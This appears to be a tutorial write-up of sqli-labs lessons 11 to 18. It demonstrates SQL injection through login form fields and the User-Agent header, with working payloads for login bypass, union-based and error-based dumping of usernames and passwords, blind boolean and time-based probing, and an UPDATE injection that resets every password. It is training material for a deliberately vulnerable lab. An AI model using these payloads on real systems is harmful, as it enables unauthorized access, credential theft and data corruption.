# Sqli and POST methods 

This section will cover some of the ways in which the ```POST``` method can be used to exploit the database. 

:warning: Most of the methods mentioned here will be the repitition of what was discussed in the previous sections. 

## Messing around with a simple login page : sqli-labs lesson-11 and lesson-12

In lesson 11, a simple login page is presented which is vulnerable to sql injection. 

Here instead of fuzzing the web app with the url, we fuzz the web-app with the input fields provided in the login form. 

On trying defaults, we are able to login using ```admin``` as username and password. 

Also, the application breaks when the user inputs ```'``` as the input in either of the input fields.

:warning: ```#``` works better as a comment for input fields. 

After we break the query, we have to follow the steps which are covered in the previous sections. 

We can bypass the login page by using the following as the input value - 

```sql
' or 1 #
```

On passing the above text, we are able to bypass the login page. We are able to do so because the value of the above text evaluates to true.

Similarly, when we pass the below mentioned text as the input for one of the fields, we get all the usernames and passwords. 

```sql 
' union select group_concat(username), group_concat(password) from users limit 0,1 #
```

:warning: Before using the ```union select``` statement, the ```order-by``` clause was used to get the number of columns used in the login page.

Lesson 12 is also quite similar to lesson-11. On passing ```\``` into the input field we get to know that the developer has used ```("")``` in the query. 


We can bypass the query and get the output by entering the below text into the input field - 

```sql
") or 1 #
```

and then we can dump all critical information by doing something similar to what we did in lesson-11. 

```sql
") union select group_concat(username), group_concat(password) from users limit 0, 1 #
```

## More fun with the login page : lesson-13 and lesson-14

This exercise doesn't show user output like in the previous exercises. However, this webpage does show mysql errors and this makes it perfect for using error-based double query injection where will be dump the user data in the form of a mysql errors. 

We first try to break the query by passing ```\``` into the input field. We get an error from which we can infer the way input is being passed to the backend. 

The query in lesson-13 can be fixed by passing ```') #``` as the input. 

The following set of queries can be used to get the username and password. 

```sql
') or ((select 1 from (select count(*), concat((select table_name from information_schema.tables where table_schema=database() limit 0,1), '::', floor(rand()*2)) as hack from information_schema.tables group by hack) as payload)) #

') or ((select 1 from (select count(*), concat((select column_name from information_schema.columns where table_name='users' limit 0,1), '::', floor(rand()*2)) as hack from information_schema.tables group by hack) as payload)) #

') or ((select 1 from (select count(*), concat((select password from users limit 3,1), '::', floor(rand()*2)) as hack from information_schema.tables group by hack) as payload)) #
```

Lesson-14 is exactly the same as lesson-13 with the only difference being how the input is being passed to the backend. 

## Resetting password : lesson-17

Here, we will be dealing with the ```Update``` query. The update query is executed when the submit button is pressed. 

:warning: Fuzzig a sql query that uses the ```update``` can cause the values in the database to change unexpectedly. An example for this is shown below. 

In lesson-17, fuzzing the username field yields nothing, therefore the we will have to use the password field to get the information that we want. In order to do this, pass ```admin``` as the password and pass ```' or 1 #``` in the password field. 

Passing ```' or 1 #``` to the password field changes all the password to ```1```. This is because the query at the backend changes to something like this - 


```sql 
UPDATE users SET password = '' or 1 # ' WHERE username='admin';
```

Since, the username field gets commented out, the password for all the users is set to ```1```.

We can get the username and password in this exercise by using double-query injection which is exactly the same as shown in the previous section. 

## Going Blind : lesson-15 and lesson-16

The login page in these challenges don't respond with any error messages. However, on successful login we do see a change in state of the web app. This can be exploited. We can make use of boolean based injections.

The following queries can be used to get interesting results about the database - 

```sql
' or (select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0, 1), 1, 1)) = 101) #

' or if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0, 1), 1, 1)) = 101), sleep(15), null) #
```

:warning: Depending on which query is being used, the webpage will either wait for a certain period of time or it may result in some change in the webpage. 

## Hello Burp : lesson-18

We make use of ```Burp``` to solve this challenge. Please refer [here](#) to know more about ```Burp```. 

On fuzzing the login page we realize that we cannot break the query and fix it again. Hence, this rules out the possibility of using boolean-based and time-based injections.

Also, the login page produces an output when ```admin``` is passed as the username and password. The output is in a from of a message that shows the user-agent of the current user. 

On intercepting the request and passing it to the repeater, we can further experiment with the request. 

We notice that when we change the user-agent from the headers tab, the response also changes. Therefore, we can conclude that the user-agent headers is vulnerable. 

When ```\``` is passed as the user-agent, we see a ```MySql``` error. Now, we can use ```Double Injections``` to exploit the app. 

On passing the below payload as the user-agent, we get to see the database name.


```sql
' or ((select 1 from (select count(*), concat((select database()), '::', floor(rand()*2), '::') as hack from information_schema.tables group by hack) as payload)) or '1
```

The above payload can be modified accordingly to get more useful information from the web app. The query shown below can be used to get the names of all the tables in the database by changing the ```offset``` of the ```limit``` clause.

```sql
' or ((select 1 from (select count(*), concat((select table_name from information_schema.tables where table_schema=database() limit 0, 1), '::', floor(rand()*2), '::') as hack from information_schema.tables group by hack) as payload)) or '1
```

Similarly, the query shown below can be used to get all the column names of a given table.

```sql
' or ((select 1 from (select count(*), concat((select column_name from information_schema.columns where table_name='users' limit 1, 1), '::', floor(rand()*2), '::') as hack from information_schema.tables group by hack) as payload)) or '1
```

And finally we can get the passwords by sending the below mentioned query as the user-agent - 

```sql 
' or ((select 1 from (select count(*), concat((select password from users limit 0, 1), '::', floor(rand()*2), '::') as hack from information_schema.tables group by hack) as payload)) or '1
```

:warning: Lesson 19 is exactly the same as lesson 18 with the only difference being that in lesson-19 the ```refers``` header needs to be exploited. 